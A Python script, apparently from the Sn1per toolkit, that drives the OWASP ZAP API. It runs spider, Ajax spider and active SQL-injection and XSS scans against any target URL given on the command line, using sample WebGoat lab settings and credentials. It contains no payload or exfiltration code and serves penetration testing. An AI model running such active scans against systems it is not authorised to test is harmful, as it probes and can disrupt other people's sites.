It works with OWASP ZAP API Python client.
To use it, you have to load the Python API client module and start ZAP

Before starting this script for the first time: Open ZAP, go to
Tools -> Options -> API -> Generate random Key, copy and paste the key in the
variable "apiKey" of the configuration area

This script is divided into two parts : a configuration area, where you have to
change variables according to your needs, and the part with API calls.

Author : aine-rb on Github, from Sopra Steria - modified for Sn1per by @xer0dayz
'''

import time
from pprint import pprint
from zapv2 import ZAPv2
import sys, getopt

targetURL = str(sys.argv[1])

#######################################
### BEGINNING OF CONFIGURATION AREA ###
#######################################
## The user only needs to change variable values bellow to make the script
## work according to his/her needs. MANDATORY parameters must not be empty

# MANDATORY. Define the API key generated by ZAP and used to verify actions.
apiKey=''

# MANDATORY. Define the listening address of ZAP instance
localProxy = {"http": "http://127.0.0.1:8081", "https": "http://127.0.0.1:8081"}

# MANDATORY. True to create another ZAP session (overwrite the former if the
# same name already exists), False to use an existing one
isNewSession = True
# MANDATORY. ZAP Session name
sessionName = 'WebgoatSession'

# Define the list of global exclude URL regular expressions. List can be empty.
# The expressions must follow the java.util.regex.Pattern class syntax
# The following example excludes every single URL except http://localhost:8081
globalExcludeUrl = ['^(?:(?!http:\/\/localhost:8081).*).$']

# MANDATORY. Define if an outgoing proxy server is used
useProxyChain = False
# MANDATORY only if useProxyChain is True, ignored otherwise.
# Outgoing proxy address and port
proxyAddress = 'my.corp.proxy'
proxyPort = '8080'
# Define the addresses to skip in case useProxyChain is True. Ignored
# otherwise. List can be empty.
skipProxyAddresses = ('127.0.0.1;'
                      'localhost')
# MANDATORY only if useProxyChain is True. Ignored otherwise.
# Define if proxy server needs authentication
useProxyChainAuth = False
# MANDATORY only if useProxyChainAuth is True. Ignored otherwise
proxyUsername = ''
proxyPassword = ''
proxyRealm = ''

# MANDATORY. Determine if a proxy script must be loaded. Proxy scripts are
# executed for every request traversing ZAP
useProxyScript = False
# MANDATORY only if useProxyScript is True. Ignored otherwise
proxyScriptName = 'proxyScript.js'
# Script engine values: "Oracle Nashorn" for Javascript,
# "jython" for python, "JSR 223 JRuby Engine" for ruby
proxyScriptEngine = 'Oracle Nashorn'
# Asolute local path
proxyScriptFileName = '/zap/scripts/proxy/proxyScript.js'
proxyScriptDescription = 'This is a description'

# MANDATORY. Determine if context must be configured then used during scans.
# You have to set this parameter to True if you want that ZAP performs scans
# from the point of view of a specific user
useContextForScan = False

# MANDATORY only if useContextForScan is True. Ignored otherwise. Set value to
# True to define a new context. Set value to False to use an existing one.
defineNewContext = False
# MANDATORY only if defineNewContext is True. Ignored otherwise
contextName = 'WebGoat_script-based'
# MANDATORY only if defineNewContext is False. Disregarded otherwise.
# Corresponds to the ID of the context to use
contextId = 0
# Define Context Include URL regular expressions. Ignored if useContextForScan
# is False. You have to put the URL you want to test in this list.
contextIncludeURL = [targetURL + '.*']
# Define Context Exclude URL regular expressions. Ignored if useContextForScan
# is False. List can be empty.
contextExcludeURL = ['http://localhost:8081/WebGoat/j_spring_security_logout',
                     'http://localhost:8081/WebGoat/logout.mvc']

# MANDATORY only if useContextForScan is True. Ignored otherwise. Define the
# session management method for the context. Possible values are:
# "cookieBasedSessionManagement"; "httpAuthSessionManagement"
sessionManagement = 'cookieBasedSessionManagement'

# MANDATORY only if useContextForScan is True. Ignored otherwise. Define
# authentication method for the context. Possible values are:
# "manualAuthentication"; "scriptBasedAuthentication"; "httpAuthentication";
# "formBasedAuthentication"
authMethod = 'scriptBasedAuthentication'

# MANDATORY only if authMethod is set to scriptBasedAuthentication.
# Ignored otherwise
authScriptName = 'TwoStepAuthentication.js'
# Script engine values: Oracle Nashorn for Javascript
# jython for python, JSR 223 JRuby Engine for ruby
authScriptEngine = 'Oracle Nashorn'
# Absolute local path
authScriptFileName = '/zap/scripts/authentication/TwoStepAuthentication.js'
authScriptDescription = 'This is a description'

# MANDATORY only if useContextForScan is True. Ignored otherwise. Each
# name/value pair of authParams are expected to be "x-www-form-urlencoded"
# Here is an example for scriptBasedAuthentication method:
authParams = ('scriptName=' + authScriptName + '&'
              'Submission Form URL=http://localhost:8081/WebGoat/j_spring_security_check&'
              'Username field=username&'
              'Password field=password&'
              'Target URL=http://localhost:8081/WebGoat/welcome.mvc')
## Here is an example for formBasedAuthentication method:
#authParams = ('loginUrl=http://localhost:8081/WebGoat/j_spring_security_check&'
#              'loginRequestData=username%3D%7B%25username%25%7D%26'
#              'password%3D%7B%25password%25%7D')
##Here is an example for httpAuthentication method:
#authParams = ('hostname=http://www.example.com&'
#              'realm=CORP\\administrator&'
#              'port=80')

# MANDATORY only if useContextForScan is True. Ignored otherwise.
# Set the value to True if a loggedin indicator must be used. False if it's a
# logged out indicator that must be used
isLoggedInIndicator = False
# MANDATORY only if useContextForScan is True. Ignored otherwise.
# Define either a loggedin or a loggedout indicator regular expression.
# It allows ZAP to see if the user is always authenticated during scans.
indicatorRegex = '\QLocation: http://localhost:8081/WebGoat/login.mvc\E'


# MANDATORY only if useContextForScan is True. Ignored otherwise.
# Set value to True to create new users, False otherwise
createUser = False
# MANDATORY only if createUser is True. Ignored otherwise. Define the list of
# users, with name and credentials (in x-www-form-urlencoded format)
## Here is an example with the script NashornTwoStepAuthentication.js:
userList = [
    {'name': 'guest', 'credentials': 'Username=guest&Password=guest'},
    {'name': 'webgoat', 'credentials': 'Username=webgoat&Password=webgoat'}
]
## Here is an example with formBasedAuthentication:
#userList = [
#    {'name': 'guest', 'credentials': 'username=guest&password=guest'},
#    {'name': 'webgoat', 'credentials': 'username=webgoat&password=webgoat'}
#]

# MANDATORY only if useContextForScan is True. Ignored otherwise. List can be
# empty. Define the userid list. Created users will be added to this list later
userIdList = []

# MANDATORY. Define the target site to test
#target = 'http://10.0.0.19/'
target = targetURL
# You can specify other URL in order to help ZAP discover more site locations
# List can be empty
applicationURL = ['']

# MANDATORY. Set value to True if you want to customize and use a scan policy
useScanPolicy = False
# MANDATORY only if useScanPolicy is True. Ignored otherwise. Set a policy name
scanPolicyName = 'SQL Injection and XSS'
# MANDATORY only if useScanPolicy is True. Ignored otherwise.
# Set value to True to disable all scan types except the ones set in ascanIds,
# False to enable all scan types except the ones set in ascanIds..
isWhiteListPolicy = False
# MANDATORY only if useScanPolicy is True. Ignored otherwise. Set the scan IDs
# to use with the policy. Other scan types will be disabled if
# isWhiteListPolicy is True, enabled if isWhiteListPolicy is False.
# Use zap.ascan.scanners() to list all ascan IDs.
## In the example bellow, the first line corresponds to SQL Injection scan IDs,
## the second line corresponds to some XSS scan IDs
ascanIds = [40018, 40019, 40020, 40021, 40022, 40024, 90018,
            40012, 40014, 40016, 40017]
# MANDATORY only if useScanPolicy is True. Ignored otherwise. Set the alert
# Threshold and the attack strength of enabled active scans.
# Currently, possible values are:
# Low, Medium and High for alert Threshold
# Low, Medium, High and Insane for attack strength
alertThreshold = 'Medium'
attackStrength = 'Low'

# MANDATORY. Set True to use Ajax Spider, False otherwise.
useAjaxSpider = True

# MANDATORY. Set True to shutdown ZAP once finished, False otherwise
shutdownOnceFinished = False

#################################
### END OF CONFIGURATION AREA ###
#################################
sys.stdout = open("/usr/share/sniper/bin/zap-report.txt", "w")

# Connect ZAP API client to the listening address of ZAP instance
zap = ZAPv2(proxies=localProxy, apikey=apiKey)

# Start the ZAP session
core = zap.core
if isNewSession:
    pprint('Create ZAP session: ' + sessionName + ' -> ' +
            core.new_session(name=sessionName, overwrite=True))
else:
    pprint('Load ZAP session: ' + sessionName + ' -> ' +
            core.load_session(name=sessionName))

# Configure ZAP global Exclude URL option
print('Add Global Exclude URL regular expressions:')
for regex in globalExcludeUrl:
    pprint(regex + ' ->' + core.exclude_from_proxy(regex=regex))

# Configure ZAP outgoing proxy server connection option
pprint('Enable outgoing proxy chain: ' + str(useProxyChain) + ' -> ' +
        core.set_option_use_proxy_chain(boolean=useProxyChain))
if useProxyChain:
    pprint('Set outgoing proxy name: ' + proxyAddress + ' -> ' +
            core.set_option_proxy_chain_name(string=proxyAddress))
    pprint('Set outgoing proxy port: ' + proxyPort + ' -> ' +
            core.set_option_proxy_chain_port(integer=proxyPort))
    pprint('Skip names for outgoing proxy: ' + skipProxyAddresses + ' -> ' +
            core.set_option_proxy_chain_skip_name(string=skipProxyAddresses))

    # Configure ZAP outgoing proxy server authentication
    pprint('Set outgoing proxy chain authentication: ' +
            str(useProxyChainAuth) + ' -> ' +
            core.set_option_use_proxy_chain_auth(boolean=useProxyChainAuth))
    if useProxyChainAuth:
        pprint('Set outgoing proxy username -> ' +
                core.set_option_proxy_chain_user_name(string=proxyUsername))
        pprint('Set outgoing proxy password -> ' +
                core.set_option_proxy_chain_password(string=proxyPassword))
        pprint('Set outgoing proxy realm: ' + proxyRealm + ' -> ' +
                core.set_option_proxy_chain_realm(string=proxyRealm))

if useProxyScript:
    script = zap.script
    script.remove(scriptname=proxyScriptName)
    pprint('Load proxy script: ' + proxyScriptName + ' -> ' +
            script.load(scriptname=proxyScriptName, scripttype='proxy',
                scriptengine=proxyScriptEngine,
                filename=proxyScriptFileName,
                scriptdescription=proxyScriptDescription))
    pprint('Enable proxy script: ' + proxyScriptName + ' -> ' +
            script.enable(scriptname=proxyScriptName))


if useContextForScan:
    # Define the ZAP context
    context = zap.context
    if defineNewContext:
        contextId = context.new_context(contextname=contextName)
    pprint('Use context ID: ' + contextId)

    # Include URL in the context
    print('Include URL in context:')
    for url in contextIncludeURL:
        pprint(url + ' -> ' +
                context.include_in_context(contextname=contextName,
                                           regex=url))

    # Exclude URL in the context
    print('Exclude URL from context:')
    for url in contextExcludeURL:
        pprint(url + ' -> ' +
                context.exclude_from_context(contextname=contextName,
                                             regex=url))

    # Setup session management for the context.
    # There is no methodconfigparams to provide for both current methods
    pprint('Set session management method: ' + sessionManagement + ' -> ' +
            zap.sessionManagement.set_session_management_method(
                contextid=contextId, methodname=sessionManagement,
                methodconfigparams=None))

    ## In case we use the scriptBasedAuthentication method, load the script
    if authMethod == 'scriptBasedAuthentication':
        script = zap.script
        script.remove(scriptname=authScriptName)
        pprint('Load script: ' + authScriptName + ' -> ' +
                script.load(scriptname=authScriptName,
                            scripttype='authentication',
                            scriptengine=authScriptEngine,
                            filename=authScriptFileName,
                            scriptdescription=authScriptDescription))

    # Define an authentication method with parameters for the context
    auth = zap.authentication
    pprint('Set authentication method: ' + authMethod + ' -> ' +
            auth.set_authentication_method(contextid=contextId,
                                           authmethodname=authMethod,
                                           authmethodconfigparams=authParams))
    # Define either a loggedin indicator or a loggedout indicator regexp
    # It allows ZAP to see if the user is always authenticated during scans
    if isLoggedInIndicator:
        pprint('Define Loggedin indicator: ' + indicatorRegex + ' -> ' +
                auth.set_logged_in_indicator(contextid=contextId,
                                        loggedinindicatorregex=indicatorRegex))
    else:
        pprint('Define Loggedout indicator: ' + indicatorRegex + ' -> ' +
                auth.set_logged_out_indicator(contextid=contextId,
                                        loggedoutindicatorregex=indicatorRegex))

    # Define the users
    users = zap.users
    if createUser:
        for user in userList:
            userName = user.get('name')
            print('Create user ' + userName + ':')
            userId = users.new_user(contextid=contextId, name=userName)
            userIdList.append(userId)
            pprint('User ID: ' + userId + '; username -> ' +
                    users.set_user_name(contextid=contextId, userid=userId,
                                        name=userName) +
                    '; credentials -> ' +
                    users.set_authentication_credentials(contextid=contextId,
                        userid=userId,
                        authcredentialsconfigparams=user.get('credentials')) +
                    '; enabled -> ' +
                    users.set_user_enabled(contextid=contextId, userid=userId,
                                           enabled=True))

# Enable all passive scanners (it's possible to do a more specific policy by
# setting needed scan ID: Use zap.pscan.scanners() to list all passive scanner
# IDs, then use zap.scan.enable_scanners(ids) to enable what you want
pprint('Enable all passive scanners -> ' +
        zap.pscan.enable_all_scanners())

ascan = zap.ascan
# Define if a new scan policy is used
if useScanPolicy:
    ascan.remove_scan_policy(scanpolicyname=scanPolicyName)
    pprint('Add scan policy ' + scanPolicyName + ' -> ' +
            ascan.add_scan_policy(scanpolicyname=scanPolicyName))
    for policyId in range(0, 5):
        # Set alert Threshold for all scans
        ascan.set_policy_alert_threshold(id=policyId,
                                         alertthreshold=alertThreshold,
                                         scanpolicyname=scanPolicyName)
        # Set attack strength for all scans
        ascan.set_policy_attack_strength(id=policyId,
                                         attackstrength=attackStrength,
                                         scanpolicyname=scanPolicyName)
    if isWhiteListPolicy:
        # Disable all active scanners in order to enable only what you need
        pprint('Disable all scanners -> ' +
                ascan.disable_all_scanners(scanpolicyname=scanPolicyName))
        # Enable some active scanners
        pprint('Enable given scan IDs -> ' +
                ascan.enable_scanners(ids=ascanIds,
                                      scanpolicyname=scanPolicyName))
    else:
        # Enable all active scanners
        pprint('Enable all scanners -> ' +
                ascan.enable_all_scanners(scanpolicyname=scanPolicyName))
        # Disable some active scanners
        pprint('Disable given scan IDs -> ' +
                ascan.disable_scanners(ids=ascanIds,
                                       scanpolicyname=scanPolicyName))
else:
    print('No custom policy used for scan')
    scanPolicyName = None

# Open URL inside ZAP
pprint('Access target URL ' + target)
core.access_url(url=target, followredirects=True)
for url in applicationURL:
    pprint('Access URL ' + url)
    core.access_url(url=url, followredirects=True)
# Give the sites tree a chance to get updated
time.sleep(2)

# Launch Spider, Ajax Spider (if useAjaxSpider is set to true) and
# Active scans, with a context and users or not
forcedUser = zap.forcedUser
spider = zap.spider
ajax = zap.ajaxSpider
scanId = 0
print('Starting Scans on target: ' + target)
if useContextForScan:
    for userId in userIdList:
        print('Starting scans with User ID: ' + userId)

        # Spider the target and recursively scan every site node found
        scanId = spider.scan_as_user(contextid=contextId, userid=userId,
                url=target, maxchildren=None, recurse=True, subtreeonly=None)
        print('Start Spider scan with user ID: ' + userId +
                '. Scan ID equals: ' + scanId)
        # Give the spider a chance to start
        time.sleep(2)
        while (int(spider.status(scanId)) < 100):
            print('Spider progress: ' + spider.status(scanId) + '%')
            time.sleep(2)
        print('Spider scan for user ID ' + userId + ' completed')

        if useAjaxSpider:
            # Prepare Ajax Spider scan
            pprint('Set forced user mode enabled -> ' +
                    forcedUser.set_forced_user_mode_enabled(boolean=True))
            pprint('Set user ID: ' + userId + ' for forced user mode -> ' +
                        forcedUser.set_forced_user(contextid=contextId,
                            userid=userId))
            # Ajax Spider the target URL
            pprint('Ajax Spider the target with user ID: ' + userId + ' -> ' +
                        ajax.scan(url=target, inscope=None))
            # Give the Ajax spider a chance to start
            time.sleep(10)
            while (ajax.status != 'stopped'):
                print('Ajax Spider is ' + ajax.status)
                time.sleep(5)
            for url in applicationURL:
                # Ajax Spider every url configured
                pprint('Ajax Spider the URL: ' + url + ' with user ID: ' +
                        userId + ' -> ' +
                        ajax.scan(url=url, inscope=None))
                # Give the Ajax spider a chance to start
                time.sleep(10)
                while (ajax.status != 'stopped'):
                    print('Ajax Spider is ' + ajax.status)
                    time.sleep(5)
            pprint('Set forced user mode disabled -> ' +
                    forcedUser.set_forced_user_mode_enabled(boolean=False))
            print('Ajax Spider scan for user ID ' + userId + ' completed')

        # Launch Active Scan with the configured policy on the target url
        # and recursively scan every site node
        scanId = ascan.scan_as_user(url=target, contextid=contextId,
                userid=userId, recurse=True, scanpolicyname=scanPolicyName,
                method=None, postdata=True)
        print('Start Active Scan with user ID: ' + userId +
                '. Scan ID equals: ' + scanId)
        # Give the scanner a chance to start
        time.sleep(2)
        while (int(ascan.status(scanId)) < 100):
            print('Active Scan progress: ' + ascan.status(scanId) + '%')
            time.sleep(2)
        print('Active Scan for user ID ' + userId + ' completed')

else:
    # Spider the target and recursively scan every site node found
    scanId = spider.scan(url=target, maxchildren=None, recurse=True,
            contextname=None, subtreeonly=None)
    print('Scan ID equals ' + scanId)
    # Give the Spider a chance to start
    time.sleep(2)
    while (int(spider.status(scanId)) < 100):
        print('Spider progress ' + spider.status(scanId) + '%')
        time.sleep(2)
    print('Spider scan completed')

    if useAjaxSpider:
        # Ajax Spider the target URL
        pprint('Start Ajax Spider -> ' + ajax.scan(url=target, inscope=None))
        # Give the Ajax spider a chance to start
        time.sleep(10)
        while (ajax.status != 'stopped'):
            print('Ajax Spider is ' + ajax.status)
            time.sleep(5)
        for url in applicationURL:
            # Ajax Spider every url configured
            pprint('Ajax Spider the URL: ' + url + ' -> ' +
                    ajax.scan(url=url, inscope=None))
            # Give the Ajax spider a chance to start
            time.sleep(10)
            while (ajax.status != 'stopped'):
                print('Ajax Spider is ' + ajax.status)
                time.sleep(5)
        print('Ajax Spider scan completed')

    # Launch Active scan with the configured policy on the target url and
    # recursively scan every site node
    scanId = zap.ascan.scan(url=target, recurse=True, inscopeonly=None,
        scanpolicyname=scanPolicyName, method=None, postdata=True)
    print('Start Active scan. Scan ID equals ' + scanId)
    while (int(ascan.status(scanId)) < 100):
        print('Active Scan progress: ' + ascan.status(scanId) + '%')
        time.sleep(5)
    print('Active Scan completed')

# Give the passive scanner a chance to finish
time.sleep(5)

# If you want to retrieve alerts:
## pprint(zap.core.alerts(baseurl=target, start=None, count=None))

# To retrieve ZAP report in XML or HTML format
## print('XML report')
## core.xmlreport()
print('HTML report:')
pprint(core.htmlreport())

if shutdownOnceFinished:
    # Shutdown ZAP once finished
    pprint('Shutdown ZAP -> ' + core.shutdown())

sys.stdout.close()
